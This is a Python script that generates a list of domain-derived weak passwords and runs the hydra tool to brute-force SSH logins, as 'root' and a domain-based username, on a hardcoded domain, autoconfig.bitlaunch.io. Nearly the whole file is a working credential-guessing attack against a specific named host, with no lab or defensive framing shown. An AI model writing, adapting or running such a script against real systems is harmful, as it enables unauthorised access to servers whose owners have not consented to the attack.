import re
import subprocess
import os

# Example usage
full_domain = "autoconfig.bitlaunch.io"

def generate_passwords(domain):
    # Remove protocol if present
    domain = re.sub(r'^https?://', '', domain)

    # Remove "www." prefix if present
    domain = re.sub(r'^www\.', '', domain)

    # Remove any file path at the end
    domain = domain.split('/')[0]

    # Remove subdomains and TLD, keeping only the SLD
    domain_parts = domain.split('.')
    if len(domain_parts) > 2:
        domain = domain_parts[-2]

    # Generate possible passwords
    passwords = []
    passwords.append(domain)
    passwords.append(domain + '123')
    passwords.append(domain + '1234')
    passwords.append(domain + '123456')
    passwords.append(domain + '123456789')
    passwords.append(domain + '@123')
    passwords.append(domain + '!123')
    passwords.append(domain + '123@')
    passwords.append(domain + '123!')
    passwords.append(domain + '123456@')
    passwords.append(domain + '123456!')
    passwords.append(domain.capitalize() + '123')
    passwords.append(domain.capitalize() + '1234')
    passwords.append(domain.capitalize() + '123456')
    passwords.append(domain.capitalize() + '123456789')
    passwords.append(domain.capitalize() + '@123')
    passwords.append(domain.capitalize() + '!123')
    passwords.append(domain.capitalize() + '123@')
    passwords.append(domain.capitalize() + '123!')
    passwords.append(domain.capitalize() + '123456@')
    passwords.append(domain.capitalize() + '123456!')
    passwords.append('Admin' + domain)
    passwords.append('Password' + domain)
    passwords.append('Pass' + domain)
    passwords.append('123' + domain)
    passwords.append('!@#' + domain)
    passwords.append('qazwsx' + domain)
    passwords.append('Qwerty' + domain)
    passwords.append(domain + '2023')
    passwords.append(domain + '@2023')
    passwords.append(domain.capitalize() + '2023')
    passwords.append(domain.capitalize() + '@2023')
    passwords.append('Admin' + domain + '123')
    passwords.append('Password' + domain + '123')
    passwords.append('Admin@' + domain)
    passwords.append('Password@' + domain)
    passwords.append('123' + domain + '123')
    passwords.append('123@' + domain)
    passwords.append(domain + '#' + '123')
    passwords.append(domain.capitalize() + '#' + '123')
    passwords.append('Master' + domain)
    passwords.append('Secret' + domain)
    passwords.append('Shadow' + domain)
    passwords.append('Monkey' + domain)
    passwords.append('Super' + domain)
    passwords.append(domain + '321')
    passwords.append(domain + '123321')
    passwords.append(domain + '!@#$')
    passwords.append(domain + 'abcd')
    passwords.append('12345678' + domain)
    passwords.append('admin123' + domain)
    passwords.append('password123' + domain)
  
    ## Date of birth patterns
    #years = [str(year)[-2:] for year in range(2015, 2024)]  # take only last 2 digits
    #months = [str(month).zfill(2) for month in range(1, 13)]
    #days = [str(day).zfill(2) for day in range(1, 32)]
    #special_chars = ['!', '#', '$']
    #
    #for year in years:
    #    for month in months:
    #        month_year_str = month + year
    #        for special_char in special_chars:
    #            passwords.append(domain + month_year_str + special_char)
    #            passwords.append(domain.capitalize() + month_year_str + special_char)
    #
    #for month in months:
    #    for day in days:
    #        day_month_str = day + month
    #        for special_char in special_chars:
    #            passwords.append(domain + day_month_str + special_char)
    #            passwords.append(domain.capitalize() + day_month_str + special_char)

    return passwords

possible_passwords = generate_passwords(full_domain)

# Save generated passwords to a file
with open('possible_passwords.txt', 'w') as f:
    for password in possible_passwords:
        f.write("%s\n" % password)

# Save the users to a file
with open('ssh_users.txt', 'w') as f:
    f.write("%s\n" % generate_passwords(full_domain)[0])  # Save only the SLD as a username
    f.write("root\n")

# Print the number of generated passwords
print(len(possible_passwords))

# Run hydra command
process = subprocess.Popen(['hydra', '-L', 'ssh_users.txt', '-P', 'possible_passwords.txt', full_domain, 'ssh', '-t', '4', '-I', '-V'], 
                           stdout=subprocess.PIPE, 
                           stderr=subprocess.STDOUT)

should_print = False
while True:
    output = process.stdout.readline()
    if output == b'' and process.poll() is not None:
        break
    if output.startswith(b'[DATA] attacking ssh://'):
        should_print = True
    if should_print:
        print(output.strip().decode('utf-8'))
result_code = process.poll()

# If hydra command failed, print custom message
if result_code != 0:
    print("SSH wasn't found on the domain")

# Delete the files
os.remove('possible_passwords.txt')
os.remove('ssh_users.txt')
